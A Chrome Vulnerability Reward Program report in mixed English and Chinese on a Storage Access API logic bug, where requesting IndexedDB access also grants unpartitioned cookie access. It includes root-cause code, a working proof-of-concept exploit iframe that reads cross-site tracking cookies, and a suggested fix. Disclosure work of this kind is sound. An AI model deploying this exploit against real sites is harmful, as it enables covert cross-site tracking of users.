# VRP Report: requestStorageAccess({indexedDB: true}) Grants Unpartitioned Cookie Access

## 1. Vulnerability Details

### Type
Logic bug — privilege escalation via Storage Access API "Beyond Cookies" feature

### Affected Component
`chrome/browser/storage_access_api/storage_access_grant_permission_context.cc:280-286`

### Root Cause

Browser-side SAA permission grant callback **unconditionally** calls `SetStorageAccessApiStatus(kAccessViaAPI)` regardless of what storage types were requested:

```cpp
// storage_access_grant_permission_context.cc:280-286
if (permission_result.status == blink::mojom::PermissionStatus::GRANTED) {
  content::RenderFrameHost* rfh = content::RenderFrameHost::FromID(frame_host_id);
  if (rfh) {
    rfh->SetStorageAccessApiStatus(net::StorageAccessApiStatus::kAccessViaAPI);
    // ↑ 无条件执行！不检查请求的是什么类型的存储
  }
}
```

This adds `kStorageAccessGrantEligible` to `document_associated_data_->cookie_setting_overrides()`.

**Renderer-side is correctly gated** (但无用，因为 browser 已经设置了):
```cpp
// document_storage_access.cc:376-378
if (request_unpartitioned_cookie_access) {  // 只有请求 cookies 时才设置
    GetSupplementable()->dom_window_->SetStorageAccessApiStatus(kAccessViaAPI);
}
```

当 iframe 之后访问 `document.cookie` 时，触发 `RestrictedCookieManager` (RCM) 的延迟绑定。RCM 使用 `GetCookieSettingOverrides()` 构造，此时已包含 `kStorageAccessGrantEligible`。

**RCM 构造函数的 DCHECK 在 release 中无效**:
```cpp
// restricted_cookie_manager.cc:435-436
DCHECK(!cookie_setting_overrides_.Has(
    net::CookieSettingOverride::kStorageAccessGrantEligible));
// ↑ Release 构建中被 strip，不做任何检查
```

### Impact Chain (完整攻击路径)

```
requestStorageAccess({indexedDB: true})
  → 权限授予 (FPS 自动/用户同意)
  → browser 回调: SetStorageAccessApiStatus(kAccessViaAPI)
  → document_associated_data 添加 kStorageAccessGrantEligible
  → 同时持久化 STORAGE_ACCESS content setting
  → iframe 访问 document.cookie
  → 延迟绑定 RCM (GetCookieSettingOverrides() 包含 override)
  → RCM 基础 override 包含 kStorageAccessGrantEligible
  → IsAllowedByStorageAccessGrant() 检查: override ✓ + content setting ✓
  → 允许未分区 cookie 访问
```

---

## 2. Vulnerability Impact

### Prerequisites (前提条件)

1. 攻击者控制一个网站 `attacker.com`
2. `attacker.com` 与目标顶层站点在**同一个 First-Party Set (FPS)** 中
   - 或者用户之前已经为 `attacker.com` 在该顶层站点授予过 SAA 权限
3. 目标顶层站点嵌入 `attacker.com` 作为跨站 iframe
4. Chrome 启用了 "Beyond Cookies" SAA 功能（已在 stable 默认启用）

### Effect (效果)

| 影响维度 | 描述 |
|---------|------|
| **隐私违规** | 只请求了 IndexedDB 却获得了完整 cookie 访问 |
| **跨站追踪** | 通过 cookie 实现跨站追踪，绕过精细化权限模型 |
| **FPS 利用** | FPS 内自动授权意味着无需任何用户交互 |
| **静默执行** | 用户/FPS 只同意了 "给你 IndexedDB"，没有任何额外提示 |
| **持久性** | STORAGE_ACCESS content setting 被持久化，cookie 访问跨会话有效 |

### Severity: Medium (Privacy Violation)

---

## 3. Reproduction Steps (复现方式)

### 环境准备

1. 两个 HTTPS 站点在同一个 First-Party Set 中:
   - `https://primary.example` (顶层站点)
   - `https://tracker.example` (攻击者控制的跨站 iframe)

2. FPS 配置 (在两个站点分别部署):
   - `https://primary.example/.well-known/first-party-set`: `{"primary": "https://primary.example", "associatedSites": ["https://tracker.example"]}`
   - `https://tracker.example/.well-known/first-party-set`: `{"primary": "https://primary.example"}`

3. 预设第三方 cookie:
   - 在 `tracker.example` 上设置: `Set-Cookie: tracking_id=secret123; SameSite=None; Secure; Path=/`

### Step-by-step

**Step 1**: 部署顶层页面 `https://primary.example/index.html`:
```html
<!DOCTYPE html>
<html>
<body>
  <h1>Top-level page (primary.example)</h1>
  <iframe src="https://tracker.example/exploit.html" 
          allow="storage-access"></iframe>
</body>
</html>
```

**Step 2**: 部署攻击 iframe `https://tracker.example/exploit.html`:
```html
<!DOCTYPE html>
<script>
async function exploit() {
  console.log("[1] Before SAA: document.cookie =", document.cookie);
  // 应该为空（第三方 cookie 被分区/阻止）

  // Step A: 只请求 indexedDB，不请求 cookies
  try {
    const handle = await document.requestStorageAccess({indexedDB: true});
    console.log("[2] SAA granted for indexedDB only");
  } catch(e) {
    console.error("SAA denied:", e);
    return;
  }

  // Step B: 等待一小段时间确保 browser-side 回调完成
  await new Promise(r => setTimeout(r, 100));

  // Step C: 访问 document.cookie — 触发延迟 RCM 绑定
  // 此时 RCM 被构造时包含 kStorageAccessGrantEligible
  const cookies = document.cookie;
  console.log("[3] After SAA(indexedDB only): document.cookie =", cookies);
  
  // 预期行为: cookies 应该为空（只请求了 indexedDB）
  // 实际行为: cookies 包含 "tracking_id=secret123"（未分区 cookie 泄露）

  if (cookies.includes("tracking_id")) {
    console.error("[BUG] Cookie access granted without requesting it!");
    document.body.innerHTML = "<h1 style='color:red'>BUG: Got cookies without requesting them!</h1>" +
      "<p>Requested: {indexedDB: true}</p>" +
      "<p>Got cookies: " + cookies + "</p>";
  }
}

// 需要用户手势触发（FPS 内可能不需要，取决于 Chrome 版本）
document.addEventListener('click', exploit);
document.body.innerHTML = '<button onclick="exploit()">Click to trigger exploit</button>';
</script>
```

**Step 3**: 在 Chrome stable 中打开 `https://primary.example/index.html`

**Step 4**: 点击 iframe 中的按钮

**Step 5**: 观察控制台输出:
- `[1]` 应显示空 cookie（跨站 cookie 被阻止）
- `[2]` 显示 SAA 授权成功
- `[3]` 显示包含 `tracking_id=secret123` 的 cookie（**BUG**：只请求了 indexedDB 却获得了 cookie）

### 简化验证（无需 FPS）

如果不想配置 FPS，可以用用户手动授权方式:

1. 用户之前为 `tracker.example` 在 `primary.example` 上授予过 SAA（通过 `requestStorageAccess()` 带用户手势）
2. 之后再次调用 `requestStorageAccess({indexedDB: true})` — 由于已有授权记录，自动通过
3. 同样触发 bug

### Debug 构建验证

在 Chromium Debug 构建中，Step C 会触发 DCHECK crash:
```
DCHECK failed: !cookie_setting_overrides_.Has(
    net::CookieSettingOverride::kStorageAccessGrantEligible)
at services/network/restricted_cookie_manager.cc:435
```

这个 DCHECK 确认了 invariant violation 存在。

---

## 4. Device Fingerprint

| Field | Value |
|-------|-------|
| **Chrome Version** | Chrome 136+ (stable, "Beyond Cookies" SAA 已启用) |
| **Build Type** | Release (DCHECK 无效) / Debug (DCHECK crash) |
| **Platform** | All (Windows/macOS/Linux/ChromeOS/Android) |
| **Required Flags** | None (默认配置即可复现) |
| **Feature Dependencies** | Storage Access API "Beyond Cookies" (shipped), First-Party Sets (shipped) |
| **Affected Channels** | Stable, Beta, Dev, Canary |
| **User Interaction** | None if within FPS (auto-grant); Click if manual |
| **Network Requirements** | Two HTTPS origins in same FPS, or pre-existing SAA grant |
| **Renderer Compromise** | Not required |

### Commit Range
- Bug introduced with "Beyond Cookies" SAA feature (the browser-side callback at `storage_access_grant_permission_context.cc:280-286` has always been unconditional since the feature was added)
- Renderer-side fix was correctly implemented but browser-side was missed

---

## 5. Suggested Fix

```cpp
// storage_access_grant_permission_context.cc — 修改回调
ContentSettingPermissionContextBase::RequestPermission(
    std::move(request_data),
    base::BindOnce(
        [](content::GlobalRenderFrameHostId frame_host_id,
           bool request_unpartitioned_cookie_access,  // 新增参数
           content::PermissionResult permission_result) {
          if (permission_result.status == GRANTED && 
              request_unpartitioned_cookie_access) {  // 新增条件
            content::RenderFrameHost* rfh = 
                content::RenderFrameHost::FromID(frame_host_id);
            if (rfh) {
              rfh->SetStorageAccessApiStatus(
                  net::StorageAccessApiStatus::kAccessViaAPI);
            }
          }
          return permission_result;
        },
        frame_host_id, request_unpartitioned_cookie_access)  // 绑定参数
        .Then(std::move(callback)));
```

Additionally: upgrade DCHECK to CHECK at `restricted_cookie_manager.cc:435`.
